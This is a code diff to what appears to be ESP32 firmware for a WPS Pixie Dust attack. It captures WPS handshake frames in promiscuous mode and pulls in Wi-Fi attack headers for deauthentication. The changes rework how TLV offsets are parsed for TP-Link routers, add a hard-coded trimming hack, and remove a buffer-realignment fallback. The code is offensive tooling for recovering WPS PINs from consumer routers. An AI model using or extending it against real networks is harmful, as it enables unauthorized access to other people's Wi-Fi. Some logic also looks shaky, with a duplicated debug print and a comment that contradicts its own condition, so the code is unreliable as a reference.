@@ -41,7 +41,7 @@
 #include <SPI.h>
 #include <SdFat.h>
 #endif
-#include "modules/wifi/wifi_atks.h" // to use deauth frames and cmds
+#include "modules/wifi/wifi_atks.h"
 #include "wifi_wpspixie.h"
 
 //===== SETTINGS =====//
@@ -322,8 +322,16 @@ static bool parseTlvBuffer(const uint8_t *buf, int bufLen) {
         int copyLen = (bufLen < PixieData::M1_BODY_MAX) ? bufLen : PixieData::M1_BODY_MAX;
         memcpy(pixieCapture.m1Body, buf, copyLen);
         pixieCapture.m1BodyLen = copyLen;
-   //     wps_clean_m1_body(pixieCapture.m1Body, (int*)&pixieCapture.m1BodyLen);
-        Serial.printf("[Pixie] Cleaned M1 body stored (%d bytes)\n", pixieCapture.m1BodyLen);
+
+        // HACK: TP-Link WR840N sends 410 bytes but the first 4 are WSC header/garbage.
+        // The real TLVs start at offset 4. Trim to 406 bytes.
+        if (pixieCapture.m1BodyLen == 410 &&
+            pixieCapture.m1Body[0] == 0x10 && pixieCapture.m1Body[1] == 0x4A) {
+            // Already starts with Version TLV? Then the extra bytes must be at the end.
+            // But we know the correct length is 406. Let's just truncate.
+            pixieCapture.m1BodyLen = 406;
+            Serial.println("[Pixie] Trimmed M1 body from 410 to 406 bytes");
+        }
     }
 
 
@@ -486,8 +494,6 @@ bool parseWpsPixieData(const wifi_promiscuous_pkt_t *pkt) {
         }
     }
 
-
-
     // TP-Link frame layout from EAP body (eapBody[]):
     //   [0]     EAPOL ver
     //   [1]     EAPOL type = 0x00
@@ -510,51 +516,50 @@ bool parseWpsPixieData(const wifi_promiscuous_pkt_t *pkt) {
     //   [17]    Flags
     //   [18+]   TLVs
 
-    int tlvBodyOffset;  // offset into eapBody[] where TLVs start
-    uint8_t wscFlags;
+int tlvBodyOffset = 0;
+    uint8_t wscFlags = 0;
+    bool wpsHasLen = false;
+    bool wpsMoreFrag = false;
 
     if (isTPLink) {
-        // TP-Link: token(4) + VID(3) + VType(4) + op(1) + flags(1) = 13
-        // If flags bit1 (MsgLen present) is set, add another 2 bytes = 15
-        int base = 13;
-        uint8_t flags = eapBody[20 + 1];   // flags byte after opcode
-        if (flags & 0x02) base += 2;
-        tlvBodyOffset = base;
-        wscFlags = flags;
+        wscFlags = eapBody[21];
+        wpsHasLen = (wscFlags & 0x02) != 0;
+        wpsMoreFrag = (wscFlags & 0x01) != 0;
+        tlvBodyOffset = 22; // The index directly following the Flags byte
+        Serial.printf("[Pixie] TP-Link: flags=0x%02X, base tlvBodyOffset=%d\n", wscFlags, tlvBodyOffset);
     } else if (outerIsDoubleWrap) {
-        // Double-wrapped (2A:00:01 outer + 8-byte inner header)
-        // Inner header at eapBody[17]: OUI(3)+VType-like(3)+op(1)+flags(1) = 8 bytes
         if (eapBody[17]==0x37 && eapBody[18]==0x2A && eapBody[19]==0x00) {
-            wscFlags     = eapBody[24];
+            wscFlags = eapBody[24];
+            wpsHasLen = (wscFlags & 0x02) != 0;
+            wpsMoreFrag = (wscFlags & 0x01) != 0;
             tlvBodyOffset = 25;
             Serial.println("[Pixie] Double-wrap: 8-byte inner header skipped");
         } else {
             Serial.printf("[Pixie] Double-wrap unexpected inner OUI: %02X%02X%02X\n",
-                          eapBody[17],eapBody[18],eapBody[19]);
+                        eapBody[17], eapBody[18], eapBody[19]);
             return false;
         }
     } else {
         // Standard WFA EAP Expanded (no token)
-        wscFlags     = eapBody[17];
+        wscFlags = eapBody[17];
+        wpsHasLen = (wscFlags & 0x02) != 0;
+        wpsMoreFrag = (wscFlags & 0x01) != 0;
         tlvBodyOffset = 18;
     }
 
-    // Message-Length flag: bit1 of Flags — present in first fragment only
-    bool wpsMoreFrag = (wscFlags & 0x01) != 0;
-    bool wpsHasLen   = (wscFlags & 0x02) != 0;
+    // Process the Message Length field exactly once for all variations
     if (wpsHasLen) {
         tlvBodyOffset += 2;  // skip 2-byte WPS total message length field
     }
 
-     Serial.printf("[Pixie] TP-Link tlvBodyOffset = %d, wpsHasLen = %d\n", tlvBodyOffset, wpsHasLen);
+    Serial.printf("[Pixie] Final computed tlvBodyOffset = %d, wpsHasLen = %d\n", tlvBodyOffset, wpsHasLen);
 
+    Serial.printf("[Pixie] TP-Link tlvBodyOffset = %d, wpsHasLen = %d\n", tlvBodyOffset, wpsHasLen);
 
     if (tlvBodyOffset >= eapBodyLen) return false;
 
     const uint8_t *tlvStart = eapBody + tlvBodyOffset;
     int            tlvBytes = eapBodyLen - tlvBodyOffset;
-
-
 
     // Reassembly logic
     if (wpsHasLen) {
@@ -582,20 +587,6 @@ bool parseWpsPixieData(const wifi_promiscuous_pkt_t *pkt) {
         if (copy > 0) {
             memcpy(g_wpsReassemblyBuf + g_wpsReassemblyLen, tlvStart, copy);
             g_wpsReassemblyLen += copy;
-        }
-    }
-
-    if (g_wpsReassemblyLen >= 2 && (g_wpsReassemblyBuf[0] != 0x10 || g_wpsReassemblyBuf[1] != 0x4A)) {
-        Serial.printf("[Pixie] ERROR: Reassembled buffer does not start with Version TLV (0x%02X%02X)\n",
-                    g_wpsReassemblyBuf[0], g_wpsReassemblyBuf[1]);
-        // Try to find Version TLV by scanning forward (fallback)
-        for (int i = 0; i < g_wpsReassemblyLen - 4; i++) {
-            if (g_wpsReassemblyBuf[i] == 0x10 && g_wpsReassemblyBuf[i+1] == 0x4A) {
-                memmove(g_wpsReassemblyBuf, g_wpsReassemblyBuf + i, g_wpsReassemblyLen - i);
-                g_wpsReassemblyLen -= i;
-                Serial.printf("[Pixie] Adjusted buffer: removed %d leading bytes\n", i);
-                break;
-            }
         }
     }
 
